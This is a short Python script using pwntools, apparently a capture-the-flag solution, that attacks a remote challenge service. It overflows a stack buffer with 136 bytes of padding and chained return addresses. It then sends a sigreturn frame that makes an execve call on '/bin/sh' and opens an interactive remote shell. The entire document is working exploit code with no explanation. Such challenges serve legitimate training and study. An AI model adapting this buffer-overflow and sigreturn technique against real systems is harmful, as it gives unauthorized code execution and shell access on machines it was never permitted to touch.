#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

io = remote('chall.v1t.site', 30211)
io.sendlineafter(b"pond.\n", b"A"*136 + p64(0x40117d) + p64(0x404050+0x80)+ p64(0x401212))

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = 0x404050
frame.rsi = 0
frame.rdx = 0
frame.rip = 0x4011f1

io.sendline(b"/bin/sh\x00".ljust(8,b'\x00') + p64(0x0)*16 + p64(0x4011ef) + p64(0xf) + p64(0x4011f1) + bytes(frame))
io.interactive()

